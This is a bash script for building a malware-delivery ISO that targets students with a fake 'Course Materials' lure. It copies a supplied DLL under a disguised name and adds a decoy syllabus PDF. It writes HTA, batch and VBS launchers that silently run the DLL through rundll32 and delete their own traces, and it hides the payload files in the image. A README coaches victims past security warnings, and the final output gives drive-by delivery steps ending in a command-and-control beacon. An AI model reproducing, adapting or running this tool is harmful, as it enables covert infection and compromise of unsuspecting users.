#!/bin/bash
# ULTIMATE ISO GENERATOR - Multiple execution methods

set -e
OUTPUT_DIR="./iso_build"
FINAL_ISO="${2:-CourseMaterials}"

banner() {
    echo -e "\033[36m"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║         ULTIMATE ISO PAYLOAD GENERATOR                    ║"
    echo "║         Multiple Execution Methods Included               ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "\033[0m"
}

mkdir -p "$OUTPUT_DIR"

# Copy DLL
cp "$1" "$OUTPUT_DIR/SystemUpdate.cache"

# Create decoy PDF
cat > "$OUTPUT_DIR/Course_Syllabus.pdf" << 'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> endobj
4 0 obj << /Length 70 >>
stream
BT /F1 24 Tf 100 700 Td (UNIVERSITY COURSE MATERIALS) Tj
/F1 14 Tf 100 650 Td (Confidential - Authorized Access Only) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000079 00000 n
0000000173 00000 n
0000000301 00000 n
trailer << /Size 5 /Root 1 0 R >>
startxref
450
%%EOF
EOF

# Method 1: HTA Launcher (Most reliable - runs via mshta.exe)
cat > "$OUTPUT_DIR/Syllabus.hta" << 'EOF'
<html>
<head><title>Course Syllabus</title>
<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" BORDER="none"/>
<script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    dir = fso.GetParentFolderName(WScript.ScriptFullName)
    
    ' Open PDF
    shell.Run "rundll32.exe shell32.dll,OpenAs_RunDLL """ & dir & "\Course_Syllabus.pdf""", 0, False
    
    ' Wait and execute
    WScript.Sleep 2000
    shell.Run "rundll32.exe """ & dir & "\SystemUpdate.cache"",Start", 0, False
    
    ' Cleanup
    WScript.Sleep 3000
    window.close()
</script>
</head>
<body>Loading syllabus...</body>
</html>
EOF

# Method 2: Batch launcher (visible to user)
cat > "$OUTPUT_DIR/Open_Syllabus.bat" << 'EOF'
@echo off
start "" "%~dp0Course_Syllabus.pdf"
timeout /t 2 /nobreak > nul
start /b rundll32.exe "%~dp0SystemUpdate.cache",Start
del /f /q "%~f0" > nul 2>&1
EOF

# Method 3: VBS fallback
cat > "$OUTPUT_DIR/SystemHelper.vbs" << 'EOF'
Set s = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
d = f.GetParentFolderName(WScript.ScriptFullName)
s.Run "rundll32.exe shell32.dll,OpenAs_RunDLL """ & d & "\Course_Syllabus.pdf""", 0, False
WScript.Sleep 2000
s.Run "rundll32.exe """ & d & "\SystemUpdate.cache"",Start", 0, False
f.DeleteFile WScript.ScriptFullName, True
EOF

# README
cat > "$OUTPUT_DIR/README.txt" << 'EOF'
===================================================
         COURSE MATERIALS - IMPORTANT
===================================================

To access your syllabus, choose ONE of these methods:

METHOD 1 (Recommended):
   Double-click "Syllabus.hta"
   Click "Allow" if prompted

METHOD 2 (Alternative):
   Double-click "Open_Syllabus.bat"

METHOD 3 (If others don't work):
   Right-click "SystemHelper.vbs" -> Open

Your PDF will open automatically.

===================================================
TECHNICAL SUPPORT:
If you see a security warning, click "More info" 
then "Run anyway"
===================================================
EOF

# Build ISO
cd "$OUTPUT_DIR"
if command -v genisoimage &>/dev/null; then
    genisoimage -J -R -hide SystemUpdate.cache -hide SystemHelper.vbs \
        -hide-joliet SystemUpdate.cache -hide-joliet SystemHelper.vbs \
        -V "Course Materials" -o "../${FINAL_ISO}.iso" . 2>/dev/null
else
    mkisofs -J -R -hide SystemUpdate.cache -hide SystemHelper.vbs \
        -hide-joliet SystemUpdate.cache -hide-joliet SystemHelper.vbs \
        -V "Course Materials" -o "../${FINAL_ISO}.iso" . 2>/dev/null
fi
cd .. && rm -rf "$OUTPUT_DIR"

banner
echo -e "\033[32m[+] Created: ${FINAL_ISO}.iso\033[0m"
echo ""
echo "Delivery instructions:"
echo "1. Upload ${FINAL_ISO}.iso to your drive-by site"
echo "2. User downloads ISO → Double-clicks → Opens Syllabus.hta"
echo "3. PDF opens, DLL runs, beacon sent to C2"
echo ""
